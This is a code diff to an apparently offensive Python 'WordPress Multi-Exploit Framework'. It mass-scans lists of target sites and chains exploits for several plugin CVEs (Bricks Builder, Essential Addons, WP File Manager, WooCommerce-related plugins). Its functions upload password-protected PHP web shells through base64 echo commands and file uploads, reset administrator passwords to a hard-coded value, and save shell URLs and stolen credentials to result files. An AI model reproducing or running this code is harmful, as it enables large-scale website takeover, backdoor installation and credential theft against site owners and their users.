@@ -9,15 +9,17 @@ import random
 import base64
 import threading
 import argparse
+from datetime import datetime
 from urllib.parse import urljoin, urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
 from bs4 import BeautifulSoup
 from rich.console import Console
+from rich.table import Table
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
 from prompt_toolkit import PromptSession, HTML
 from prompt_toolkit.history import InMemoryHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
-from alive_progress import alive_bar
 
 # Color setup
 RED = "\033[91m"
@@ -35,6 +37,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Global variables
 SHELL_PASSWORD = "K3ysTr0K3R_2024"
+SUCCESSFUL_EXPLOITS = []
+FAILED_EXPLOITS = []
 
 # Powerful PHP Shell
 POWERFUL_SHELL = f"""<?php
@@ -177,6 +181,7 @@ class WordPressExploiter:
     def exploit_bricks_builder(self, target_url):
         """CVE-2024-25600 - Bricks Builder RCE"""
         print(f"  {CYAN}[*]{RESET} Exploiting Bricks Builder (CVE-2024-25600)...")
+        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
         
         nonce = self.fetch_bricks_nonce(target_url)
         if not nonce:
@@ -189,31 +194,36 @@ class WordPressExploiter:
         test_element = self.create_bricks_element(nonce)
         
         for path in BRICKS_PATHS:
+            test_url = target_url + path
+            print(f"    {CYAN}[*]{RESET} Testing endpoint: {test_url}")
+            
             try:
-                resp = self.session.post(target_url + path, json=test_element, timeout=10)
+                resp = self.session.post(test_url, json=test_element, timeout=10)
                 
                 if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
                     print(f"    {GREEN}[✓]{RESET} Target is vulnerable!")
                     
-                    # Try to upload shell using command execution
+                    # Try to upload shell
                     shell_name = f"shell_{random.randint(1000,9999)}.php"
-                    
-                    # Create PHP file using echo command
                     encoded_shell = base64.b64encode(SIMPLE_SHELL.encode()).decode()
                     create_cmd = f"echo '{encoded_shell}' | base64 -d > {shell_name}"
                     
                     cmd_element = self.create_bricks_element(nonce, create_cmd)
-                    resp = self.session.post(target_url + path, json=cmd_element, timeout=10)
+                    resp = self.session.post(test_url, json=cmd_element, timeout=10)
                     
                     if resp.status_code == 200:
                         shell_url = urljoin(target_url, shell_name)
+                        print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
+                        
                         if self.verify_shell(shell_url):
                             print(f"    {GREEN}[✓]{RESET} Shell uploaded and verified!")
-                            print(f"    {CYAN}[→]{RESET} URL: {shell_url}")
+                            print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
+                            print(f"    {GREEN}[→]{RESET} Password: {SHELL_PASSWORD}")
                             return True, shell_url
                     
                     return False, None
-            except:
+            except Exception as e:
+                print(f"    {RED}[-]{RESET} Error: {str(e)}")
                 continue
         
         return False, None
@@ -221,6 +231,7 @@ class WordPressExploiter:
     def exploit_cve_2023_32243(self, target_url):
         """CVE-2023-32243 - Essential Addons for Elementor Authentication Bypass"""
         print(f"  {CYAN}[*]{RESET} Exploiting CVE-2023-32243...")
+        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
         
         clean_url = target_url.replace('http://', '').replace('https://', '')
         
@@ -228,24 +239,32 @@ class WordPressExploiter:
             # Get username
             user = None
             
+            # Try REST API
+            rest_url = f'http://{clean_url}/wp-json/wp/v2/users'
+            print(f"    {CYAN}[*]{RESET} Attempting to enumerate users via: {rest_url}")
+            
             try:
-                resp = self.session.get(f'http://{clean_url}/wp-json/wp/v2/users', timeout=10)
+                resp = self.session.get(rest_url, timeout=10)
                 if '"slug":"' in resp.text:
                     users = re.findall('"slug":"(.*?)"', resp.text)
                     if users:
                         user = users[0]
-                        print(f"    {GREEN}[+]{RESET} Username found: {user}")
+                        print(f"    {GREEN}[+]{RESET} Username found via REST API: {user}")
             except:
                 pass
             
+            # Try sitemap if REST API failed
             if not user:
+                sitemap_url = f'http://{clean_url}/author-sitemap.xml'
+                print(f"    {CYAN}[*]{RESET} Trying sitemap: {sitemap_url}")
+                
                 try:
-                    resp = self.session.get(f'http://{clean_url}/author-sitemap.xml', timeout=10)
+                    resp = self.session.get(sitemap_url, timeout=10)
                     if 'Sitemap' in resp.text:
                         users = re.findall('author/(.*?)/', resp.text)
                         if users:
                             user = users[0]
-                            print(f"    {GREEN}[+]{RESET} Username found: {user}")
+                            print(f"    {GREEN}[+]{RESET} Username found via sitemap: {user}")
                 except:
                     pass
             
@@ -254,6 +273,7 @@ class WordPressExploiter:
                 return False, None
             
             # Get nonce
+            print(f"    {CYAN}[*]{RESET} Fetching nonce from: http://{clean_url}")
             response = self.session.get(f'http://{clean_url}', timeout=10).text
             nonce_match = re.findall('admin-ajax.php","nonce":"(.*?)"', response)
             if not nonce_match:
@@ -261,8 +281,12 @@ class WordPressExploiter:
                 return False, None
             
             nonce = nonce_match[0]
+            print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
             
             # Reset password
+            ajax_url = f'http://{clean_url}/wp-admin/admin-ajax.php'
+            print(f"    {CYAN}[*]{RESET} Sending password reset request to: {ajax_url}")
+            
             payload = {
                 "action": "login_or_register_user",
                 "eael-resetpassword-submit": "true",
@@ -274,17 +298,19 @@ class WordPressExploiter:
                 "rp_login": user
             }
             
-            resp = self.session.post(f'http://{clean_url}/wp-admin/admin-ajax.php', data=payload, timeout=10)
+            resp = self.session.post(ajax_url, data=payload, timeout=10)
             
             if 'success":true' in resp.text:
+                login_url = f'http://{clean_url}/wp-login.php'
                 print(f"    {GREEN}[✓]{RESET} Password reset successful!")
-                print(f"    {CYAN}[→]{RESET} Login: http://{clean_url}/wp-login.php | {user}:{SHELL_PASSWORD}")
+                print(f"    {GREEN}[→]{RESET} Login URL: {login_url}")
+                print(f"    {GREEN}[→]{RESET} Username: {user}")
+                print(f"    {GREEN}[→]{RESET} Password: {SHELL_PASSWORD}")
                 
-                with open('cve_2023_32243_results.txt', 'a') as f:
-                    f.write(f"http://{clean_url}/wp-login.php|{user}|{SHELL_PASSWORD}\n")
-                
-                return True, f"Credentials: {user}:{SHELL_PASSWORD}"
+                result = f"Credentials: {user}:{SHELL_PASSWORD} | Login: {login_url}"
+                return True, result
             else:
+                print(f"    {RED}[-]{RESET} Password reset failed")
                 return False, None
                 
         except Exception as e:
@@ -293,14 +319,18 @@ class WordPressExploiter:
     
     def exploit_pix_woocommerce(self, target_url):
         """CVE-2026-3891 - Pix for WooCommerce RCE"""
-        print(f"  {CYAN}[*]{RESET} Exploiting Pix for WooCommerce...")
+        print(f"  {CYAN}[*]{RESET} Exploiting Pix for WooCommerce (CVE-2026-3891)...")
+        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
         
         base_url = target_url.rstrip('/')
         
         try:
             # Get nonce
+            ajax_url = f"{base_url}/wp-admin/admin-ajax.php"
+            print(f"    {CYAN}[*]{RESET} Fetching nonce from: {ajax_url}")
+            
             nonce_resp = self.session.post(
-                f"{base_url}/wp-admin/admin-ajax.php",
+                ajax_url,
                 data={"action": "lkn_pix_for_woocommerce_generate_nonce"},
                 timeout=10
             )
@@ -309,11 +339,16 @@ class WordPressExploiter:
                 nonce_data = nonce_resp.json()
                 nonce = nonce_data.get('data', {}).get('nonce')
                 if not nonce:
+                    print(f"    {RED}[-]{RESET} Failed to get nonce")
                     return False, None
+                print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
             except:
+                print(f"    {RED}[-]{RESET} Invalid nonce response")
                 return False, None
             
             # Upload shell
+            print(f"    {CYAN}[*]{RESET} Uploading shell...")
+            
             files = {
                 'certificate_crt_path': ('shell.php', SIMPLE_SHELL, 'application/x-php')
             }
@@ -323,21 +358,29 @@ class WordPressExploiter:
                 'settings': json.dumps({'enabled': 'yes'})
             }
             
-            resp = self.session.post(f"{base_url}/wp-admin/admin-ajax.php", files=files, data=data, timeout=30)
+            resp = self.session.post(ajax_url, files=files, data=data, timeout=30)
             
             if resp.status_code == 200:
                 shell_url = f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/shell.php"
+                print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
+                
                 if self.verify_shell(shell_url):
-                    print(f"    {GREEN}[✓]{RESET} Shell verified!")
+                    print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
+                    print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
+                    print(f"    {GREEN}[→]{RESET} Password: {SHELL_PASSWORD}")
                     return True, shell_url
+                else:
+                    print(f"    {RED}[-]{RESET} Shell verification failed")
             
             return False, None
         except Exception as e:
+            print(f"    {RED}[-]{RESET} Error: {str(e)}")
             return False, None
     
     def exploit_mpmf_rce(self, target_url):
         """CVE-2024-50526 - MPMF RCE"""
-        print(f"  {CYAN}[*]{RESET} Exploiting MPMF RCE...")
+        print(f"  {CYAN}[*]{RESET} Exploiting MPMF RCE (CVE-2024-50526)...")
+        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
         
         base_url = target_url.rstrip('/')
         
@@ -345,19 +388,27 @@ class WordPressExploiter:
         form_names = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload']
         detected_form = None
         
+        print(f"    {CYAN}[*]{RESET} Detecting form name...")
+        
         for fname in form_names:
+            test_url = f"{base_url}/?form_name={fname}"
             try:
-                resp = self.session.get(f"{base_url}/?form_name={fname}", timeout=5)
+                resp = self.session.get(test_url, timeout=5)
                 if resp.status_code == 200 and 'mpmf' in resp.text.lower():
                     detected_form = fname
+                    print(f"    {GREEN}[+]{RESET} Detected form: {detected_form}")
                     break
             except:
                 continue
         
         if not detected_form:
+            print(f"    {RED}[-]{RESET} Could not detect form name")
             return False, None
         
         # Upload shell
+        upload_url = f"{base_url}/mpmf-1/"
+        print(f"    {CYAN}[*]{RESET} Uploading shell to: {upload_url}")
+        
         files = {
             'file1': ('shell.php', SIMPLE_SHELL, 'application/x-php')
         }
@@ -369,7 +420,7 @@ class WordPressExploiter:
         }
         
         try:
-            resp = self.session.post(f"{base_url}/mpmf-1/", files=files, data=data, timeout=30)
+            resp = self.session.post(upload_url, files=files, data=data, timeout=30)
             
             if resp.status_code == 200:
                 test_paths = [
@@ -379,18 +430,24 @@ class WordPressExploiter:
                 ]
                 
                 for test_url in test_paths:
+                    print(f"    {CYAN}[*]{RESET} Checking: {test_url}")
                     if self.verify_shell(test_url):
+                        print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
+                        print(f"    {GREEN}[→]{RESET} Shell URL: {test_url}")
                         return True, test_url
             
             return False, None
-        except:
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} Error: {str(e)}")
             return False, None
     
     def exploit_woocommerce_upload(self, target_url):
         """CVE-2024-51793 - WooCommerce Upload RCE"""
-        print(f"  {CYAN}[*]{RESET} Exploiting WooCommerce upload...")
+        print(f"  {CYAN}[*]{RESET} Exploiting WooCommerce Upload (CVE-2024-51793)...")
+        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
         
         ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
+        print(f"    {CYAN}[*]{RESET} Using AJAX endpoint: {ajax_url}")
         
         files = {
             'file': ('shell.php', SIMPLE_SHELL, 'image/jpeg')
@@ -406,25 +463,39 @@ class WordPressExploiter:
                 url_match = re.search(r'(https?://[^\s\'"<>]+\.php)', resp.text)
                 if url_match:
                     shell_url = url_match.group(1)
+                    print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
+                    
                     if self.verify_shell(shell_url):
+                        print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
+                        print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
                         return True, shell_url
             
             return False, None
-        except:
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} Error: {str(e)}")
             return False, None
     
     def exploit_wp_file_manager(self, target_url):
         """CVE-2020-25213 - WP File Manager RCE"""
-        print(f"  {CYAN}[*]{RESET} Exploiting WP File Manager...")
+        print(f"  {CYAN}[*]{RESET} Exploiting WP File Manager (CVE-2020-25213)...")
+        print(f"  {CYAN}[→]{RESET} Target: {target_url}")
         
         connector_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
+        print(f"    {CYAN}[*]{RESET} Connector URL: {connector_url}")
         
         try:
+            # Check if vulnerable
             check_resp = self.session.get(connector_url, timeout=5)
             if check_resp.status_code != 200:
+                print(f"    {RED}[-]{RESET} Connector not accessible")
                 return False, None
             
+            print(f"    {GREEN}[+]{RESET} Connector is accessible")
+            
+            # Upload shell
             shell_name = f"shell_{random.randint(1000,9999)}.php"
+            print(f"    {CYAN}[*]{RESET} Uploading shell: {shell_name}")
+            
             files = {
                 'upload[]': (shell_name, SIMPLE_SHELL, 'application/x-php')
             }
@@ -438,11 +509,16 @@ class WordPressExploiter:
             
             if resp.status_code == 200:
                 shell_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
+                print(f"    {CYAN}[*]{RESET} Verifying shell at: {shell_url}")
+                
                 if self.verify_shell(shell_url):
+                    print(f"    {GREEN}[✓]{RESET} Shell verified and working!")
+                    print(f"    {GREEN}[→]{RESET} Shell URL: {shell_url}")
                     return True, shell_url
             
             return False, None
-        except:
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} Error: {str(e)}")
             return False, None
     
     def interactive_bricks_shell(self, target_url, nonce):
@@ -476,46 +552,176 @@ class WordPressExploiter:
                 break
     
     def run_all_exploits(self, target_url):
-        """Run all exploits"""
-        print(f"\n{YELLOW}[*]{RESET} Testing exploits on: {target_url}")
+        """Run all exploits and track results"""
+        print(f"\n{'='*80}")
+        print(f"{YELLOW}[*]{RESET} Testing exploits on: {GREEN}{target_url}{RESET}")
+        print(f"{'='*80}")
         
-        # Try Bricks Builder first (interactive shell)
+        exploit_results = {
+            'url': target_url,
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'successful_exploits': [],
+            'failed_exploits': []
+        }
+        
+        # Try Bricks Builder first
         print(f"\n  {BLUE}[▶]{RESET} Trying Bricks Builder (CVE-2024-25600)...")
         nonce = self.fetch_bricks_nonce(target_url)
         if nonce:
-            # Test if vulnerable
             test_element = self.create_bricks_element(nonce)
             for path in BRICKS_PATHS:
                 try:
                     resp = self.session.post(target_url + path, json=test_element, timeout=10)
                     if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
                         print(f"  {GREEN}[✓]{RESET} Bricks Builder is vulnerable!")
+                        exploit_results['successful_exploits'].append({
+                            'exploit': 'CVE-2024-25600 - Bricks Builder RCE',
+                            'result': 'Interactive shell access'
+                        })
                         self.interactive_bricks_shell(target_url, nonce)
-                        return True, "Interactive shell opened"
+                        return exploit_results
                 except:
                     continue
         
         # Try other exploits
         exploits = [
-            ('CVE-2023-32243 (Auth Bypass)', self.exploit_cve_2023_32243),
-            ('CVE-2026-3891 (Pix for WooCommerce)', self.exploit_pix_woocommerce),
-            ('CVE-2024-50526 (MPMF RCE)', self.exploit_mpmf_rce),
-            ('CVE-2024-51793 (WooCommerce Upload)', self.exploit_woocommerce_upload),
-            ('CVE-2020-25213 (WP File Manager)', self.exploit_wp_file_manager),
+            ('CVE-2023-32243 - Essential Addons Auth Bypass', self.exploit_cve_2023_32243),
+            ('CVE-2026-3891 - Pix for WooCommerce RCE', self.exploit_pix_woocommerce),
+            ('CVE-2024-50526 - MPMF RCE', self.exploit_mpmf_rce),
+            ('CVE-2024-51793 - WooCommerce Upload RCE', self.exploit_woocommerce_upload),
+            ('CVE-2020-25213 - WP File Manager RCE', self.exploit_wp_file_manager),
         ]
         
         for exploit_name, exploit_func in exploits:
             print(f"\n  {BLUE}[▶]{RESET} Trying {exploit_name}...")
-            success, result = exploit_func(target_url)
-            
-            if success:
-                print(f"\n  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
-                print(f"  {GREEN}[✓] SUCCESS!{RESET} {exploit_name}")
-                print(f"  {GREEN}[✓] Result:{RESET} {result}")
-                print(f"  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
-                return True, result
+            try:
+                success, result = exploit_func(target_url)
+                
+                if success:
+                    print(f"\n  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                    print(f"  {GREEN}[✓] SUCCESS!{RESET} {exploit_name}")
+                    print(f"  {GREEN}[✓] Result:{RESET} {result}")
+                    print(f"  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                    
+                    exploit_results['successful_exploits'].append({
+                        'exploit': exploit_name,
+                        'result': result
+                    })
+                else:
+                    print(f"  {RED}[✗] FAILED{RESET} {exploit_name}")
+                    exploit_results['failed_exploits'].append(exploit_name)
+                    
+            except Exception as e:
+                print(f"  {RED}[✗] ERROR{RESET} {exploit_name}: {str(e)}")
+                exploit_results['failed_exploits'].append(f"{exploit_name} (Error: {str(e)})")
         
-        return False, None
+        return exploit_results
+
+def save_results(all_results, output_file=None):
+    """Save all results to files"""
+    if not output_file:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"exploit_results_{timestamp}.txt"
+    
+    # Save detailed results
+    with open(output_file, 'w') as f:
+        f.write("="*80 + "\n")
+        f.write("WORDPRESS EXPLOIT FRAMEWORK - RESULTS\n")
+        f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"Default Password: {SHELL_PASSWORD}\n")
+        f.write("="*80 + "\n\n")
+        
+        successful_total = 0
+        for result in all_results:
+            if result['successful_exploits']:
+                successful_total += 1
+                f.write(f"\n{'='*80}\n")
+                f.write(f"TARGET: {result['url']}\n")
+                f.write(f"Time: {result['timestamp']}\n")
+                f.write(f"{'='*80}\n")
+                
+                f.write("\n[SUCCESSFUL EXPLOITS]\n")
+                for exploit in result['successful_exploits']:
+                    f.write(f"  ✓ {exploit['exploit']}\n")
+                    f.write(f"    Result: {exploit['result']}\n")
+                    f.write(f"    Password: {SHELL_PASSWORD}\n\n")
+                
+                if result['failed_exploits']:
+                    f.write("\n[FAILED EXPLOITS]\n")
+                    for exploit in result['failed_exploits']:
+                        f.write(f"  ✗ {exploit}\n")
+        
+        f.write(f"\n{'='*80}\n")
+        f.write(f"SUMMARY\n")
+        f.write(f"{'='*80}\n")
+        f.write(f"Total Targets Scanned: {len(all_results)}\n")
+        f.write(f"Successfully Exploited: {successful_total}\n")
+        f.write(f"Failed: {len(all_results) - successful_total}\n")
+    
+    # Save simplified results for quick reference
+    quick_file = output_file.replace('.txt', '_quick.txt')
+    with open(quick_file, 'w') as f:
+        f.write("# Quick Reference - Successful Exploits\n")
+        f.write(f"# Password: {SHELL_PASSWORD}\n\n")
+        
+        for result in all_results:
+            if result['successful_exploits']:
+                f.write(f"\nURL: {result['url']}\n")
+                for exploit in result['successful_exploits']:
+                    if 'Shell URL' in str(exploit['result']):
+                        f.write(f"Shell: {exploit['result']}\n")
+                    elif 'Credentials' in str(exploit['result']):
+                        f.write(f"Credentials: {exploit['result']}\n")
+                    else:
+                        f.write(f"Result: {exploit['result']}\n")
+                f.write("-"*50 + "\n")
+    
+    # Save shells only
+    shells_file = output_file.replace('.txt', '_shells.txt')
+    with open(shells_file, 'w') as f:
+        f.write("# Uploaded Shells\n")
+        f.write(f"# Password: {SHELL_PASSWORD}\n\n")
+        
+        for result in all_results:
+            for exploit in result['successful_exploits']:
+                if 'Shell URL:' in str(exploit['result']) or 'http' in str(exploit['result']):
+                    if 'http' in str(exploit['result']):
+                        urls = re.findall(r'https?://[^\s]+', str(exploit['result']))
+                        for url in urls:
+                            f.write(f"{url}?p={SHELL_PASSWORD}\n")
+    
+    return output_file, quick_file, shells_file
+
+def display_results_table(all_results):
+    """Display results in a nice table format"""
+    table = Table(title="Exploit Results", style="cyan")
+    table.add_column("#", style="bold yellow")
+    table.add_column("Target URL", style="bold green")
+    table.add_column("Successful Exploits", style="bold green")
+    table.add_column("Details", style="bold white")
+    
+    successful_count = 0
+    for idx, result in enumerate(all_results, 1):
+        if result['successful_exploits']:
+            successful_count += 1
+            details = []
+            for exploit in result['successful_exploits']:
+                if 'Shell URL' in str(exploit['result']):
+                    details.append("Shell Uploaded")
+                elif 'Credentials' in str(exploit['result']):
+                    details.append("Credentials Obtained")
+                else:
+                    details.append("Exploited")
+            
+            table.add_row(
+                str(idx),
+                result['url'][:50],
+                str(len(result['successful_exploits'])),
+                ", ".join(details)
+            )
+    
+    color.print(table)
+    return successful_count
 
 def ascii_art():
     color.print("""[yellow]
@@ -525,8 +731,9 @@ def ascii_art():
 / /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
 \____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
     [/yellow]""", style="bold")
-    print("Coded By: K3ysTr0K3R & Enhanced with Multiple CVEs")
-    print("Exploits: CVE-2024-25600 | CVE-2023-32243 | CVE-2026-3891 | CVE-2024-50526 | CVE-2024-51793 | CVE-2020-25213")
+    print(f"{BOLD}{CYAN}Coded By: K3ysTr0K3R & Enhanced Team{RESET}")
+    print(f"{BOLD}{WHITE}Exploits: CVE-2024-25600 | CVE-2023-32243 | CVE-2026-3891 | CVE-2024-50526 | CVE-2024-51793 | CVE-2020-25213{RESET}")
+    print(f"{BOLD}{YELLOW}Default Shell Password: {SHELL_PASSWORD}{RESET}")
     print("")
 
 def scan_file(target_file, threads):
@@ -537,50 +744,105 @@ def scan_file(target_file, threads):
             return
     
     exploiter = WordPressExploiter()
-    results = []
+    all_results = []
+    total = len(urls)
+    completed = 0
     
-    with alive_bar(len(urls), title="Scanning Targets", bar="smooth", enrich_print=False) as bar:
+    print(f"\n[bold bright_blue][*][/bold bright_blue] Loading targets from: {target_file}")
+    print(f"[bold bright_blue][*][/bold bright_blue] Total targets: {total}")
+    print(f"[bold bright_blue][*][/bold bright_blue] Threads: {threads}")
+    print(f"[bold bright_blue][*][/bold bright_blue] Default password: {SHELL_PASSWORD}\n")
+    
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+    ) as progress:
+        task = progress.add_task("[cyan]Scanning targets...", total=total)
+        
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = {executor.submit(exploiter.run_all_exploits, url): url for url in urls}
             
             for future in as_completed(futures):
                 url = futures[future]
+                completed += 1
                 try:
-                    success, result = future.result(timeout=180)
-                    if success:
-                        results.append({'url': url, 'result': result})
-                        color.print(f"\n[bold bright_green][+][/bold bright_green] Success: {url}")
+                    result = future.result(timeout=300)
+                    all_results.append(result)
+                    
+                    if result['successful_exploits']:
+                        color.print(f"\n[bold bright_green][✓][/bold bright_green] [{completed}/{total}] SUCCESS: {url}")
+                        for exploit in result['successful_exploits']:
+                            color.print(f"    [green]→[/green] {exploit['exploit']}")
+                    else:
+                        color.print(f"\n[bold bright_red][✗][/bold bright_red] [{completed}/{total}] FAILED: {url}")
+                        
                 except Exception as e:
-                    color.print(f"\n[bold bright_red][-][/bold bright_red] Failed: {url} - {str(e)}")
-                bar()
+                    color.print(f"\n[bold bright_red][✗][/bold bright_red] [{completed}/{total}] ERROR: {url} - {str(e)}")
+                    all_results.append({
+                        'url': url,
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        'successful_exploits': [],
+                        'failed_exploits': ['Error: ' + str(e)]
+                    })
+                
+                progress.update(task, advance=1)
+    
+    # Display summary
+    print(f"\n{'='*80}")
+    successful_count = display_results_table(all_results)
     
     # Save results
-    if results:
-        with open('exploit_results.txt', 'w') as f:
-            for result in results:
-                f.write(f"URL: {result['url']}\n")
-                f.write(f"Result: {result['result']}\n")
-                f.write("-" * 50 + "\n")
-        
-        color.print(f"\n[bold bright_green][+][/bold bright_green] Results saved to exploit_results.txt")
+    if all_results:
+        output_file, quick_file, shells_file = save_results(all_results)
+        print(f"\n[bold bright_green][✓][/bold bright_green] Results saved to:")
+        print(f"    📄 Detailed: {output_file}")
+        print(f"    📄 Quick ref: {quick_file}")
+        print(f"    📄 Shells only: {shells_file}")
+    
+    print(f"\n[bold bright_yellow][!][/bold bright_yellow] Summary:")
+    print(f"    Total targets: {total}")
+    print(f"    Successfully exploited: {successful_count}")
+    print(f"    Failed: {total - successful_count}")
+    print(f"    Success rate: {(successful_count/total)*100:.1f}%")
 
 def main():
+    os.system('clear' if os.name != 'nt' else 'cls')
     ascii_art()
     
-    parser = argparse.ArgumentParser(description='WordPress Multi-Exploit Framework')
-    parser.add_argument('-u', '--url', help='Target URL to exploit')
-    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
-    parser.add_argument('-f', '--file', help='File containing URLs to scan')
+    parser = argparse.ArgumentParser(description='WordPress Multi-Exploit Framework - Complete Edition')
+    parser.add_argument('-u', '--url', help='Single target URL to exploit')
+    parser.add_argument('-f', '--file', help='File containing URLs to scan (one per line)')
+    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads for scanning (default: 10)')
+    parser.add_argument('-o', '--output', help='Custom output file name (default: auto-generated)')
     
     args = parser.parse_args()
     
-    exploiter = WordPressExploiter()
-    
     if args.url:
-        success, result = exploiter.run_all_exploits(args.url)
-        if not success:
-            color.print("[bold bright_red][~][/bold bright_red] No exploits succeeded")
+        # Single target mode
+        exploiter = WordPressExploiter()
+        result = exploiter.run_all_exploits(args.url)
+        
+        if result['successful_exploits']:
+            print(f"\n{GREEN}{'='*80}{RESET}")
+            print(f"{GREEN}[✓] EXPLOITATION COMPLETE{RESET}")
+            print(f"{GREEN}{'='*80}{RESET}")
+            for exploit in result['successful_exploits']:
+                print(f"\n{GREEN}Exploit:{RESET} {exploit['exploit']}")
+                print(f"{GREEN}Result:{RESET} {exploit['result']}")
+                print(f"{GREEN}Password:{RESET} {SHELL_PASSWORD}")
+            
+            # Save single result
+            save_results([result], args.output)
+        else:
+            print(f"\n{RED}[✗] No exploits succeeded on {args.url}{RESET}")
+            
     elif args.file:
+        # File mode
+        if not os.path.exists(args.file):
+            color.print(f"[bold bright_red][~][/bold bright_red] File not found: {args.file}")
+            return
         scan_file(args.file, args.threads)
     else:
         parser.print_help()
